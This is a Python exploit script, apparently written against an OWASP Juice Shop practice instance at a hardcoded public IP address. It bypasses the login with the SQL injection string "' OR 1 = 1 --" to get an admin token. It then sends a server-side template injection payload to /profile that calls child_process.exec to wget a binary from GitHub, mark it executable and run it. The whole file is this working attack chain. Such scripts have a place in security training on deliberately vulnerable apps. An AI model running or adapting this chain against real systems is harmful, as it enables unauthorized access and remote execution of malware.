import requests
import logging
from urllib.parse import urljoin, quote
import sys

requests.packages.urllib3.disable_warnings()


class CustomLogger:
    def __init__(self, name: str, level: int = logging.INFO):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(level)

        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)


class SSTITester:
    def __init__(self, base_url: str):
        if not base_url:
            raise ValueError("Base URL cannot be empty")

        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.8',
            'Referer': f'{self.base_url}/profile',
            'Origin': self.base_url,
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Sec-GPC': '1'
        }
        self.logger = CustomLogger("SSTITester").logger

    def login_as_admin(self, email: str = "' OR 1 = 1 --", password: str = "whatever") -> bool:
        """Authenticate as admin user"""
        payload = {"email": email, "password": password}
        login_url = f"{self.base_url}/rest/user/login"

        try:
            self.logger.info(f"[LOGIN] Attempting login with payload: {payload}")

            response = self.session.post(
                login_url,
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
                    'Accept': 'application/json',
                    'Origin': self.base_url,
                    'Referer': f'{self.base_url}/login'
                },
                timeout=10,
                verify=False
            )

            self.logger.info(f"[LOGIN] Status code: {response.status_code}")
            self.logger.info(f"[LOGIN] Response: {response.text}")

            if response.status_code == 200 and "authentication" in response.json():
                token = response.json()["authentication"]["token"]
                self.session.cookies.set("token", token)
                self.logger.info(f"[LOGIN] Successfully authenticated. Token: {token}")
                return True

            self.logger.error("[LOGIN] Authentication failed - Invalid response format")
            return False

        except requests.RequestException as e:
            self.logger.error(f"[LOGIN ERROR] {e}")
            return False

    def test_ssti(self, payload: str) -> bool:
        """Send SSTI payload to /profile"""
        if not payload:
            self.logger.error("Payload cannot be empty")
            return False

        self.logger.info("Sending SSTI payload")
        try:
            # Encode the payload for URL transmission
            encoded_payload = quote(payload)

            # Prepare cookies with the token
            cookies = {
                'token': self.session.cookies.get("token", "")
            }

            # Send the payload
            response = self.session.post(
                urljoin(self.base_url, "/profile"),
                data=f"username={encoded_payload}",
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Referer': f'{self.base_url}/profile',
                    'Origin': self.base_url
                },
                cookies=cookies,
                verify=False,
                timeout=10
            )

            self.logger.info(f"Status Code: {response.status_code}")
            self.logger.info(f"Response: {response.text}")

            # Check for success
            if response.status_code in [200, 302] or "malware" in response.text:
                self.logger.info("SSTI payload executed successfully!")
                return True

            self.logger.error("SSTI payload did not execute")
            return False

        except requests.RequestException as e:
            self.logger.error(f"Error during SSTI test: {e}")
            return False

    def run(self) -> None:
        """Run the SSTI test sequence"""
        try:
            if not self.login_as_admin():
                return

            rce_payload = """#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware')}"""

            if self.test_ssti(rce_payload):
                self.logger.info("RCE Payload executed successfully!")
            else:
                self.logger.error("RCE Payload failed")
        except Exception as e:
            self.logger.error(f"Critical error during test: {str(e)}")


def SSTI():
    try:
        logging.basicConfig(level=logging.INFO)
        base_url = "http://45.76.47.218:3000"
        tester = SSTITester(base_url)
        tester.run()
    except Exception as e:
        logging.error(f"Fatal error: {str(e)}")
        sys.exit(1)
